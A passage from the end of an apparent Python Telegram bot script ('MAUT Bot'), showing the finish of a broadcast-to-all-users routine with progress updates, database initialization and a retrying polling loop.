                    f"📢 Broadcasting to {total} users... ({idx}/{total})",
                    message.chat.id,
                    progress_msg.message_id
                )
            except:
                pass
    
    bot.edit_message_text(
        f"✅ Broadcast completed!\n\nSuccess: {success}\nFailed: {total - success}",
        message.chat.id,
        progress_msg.message_id
    )

# Initialize database
init_db()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
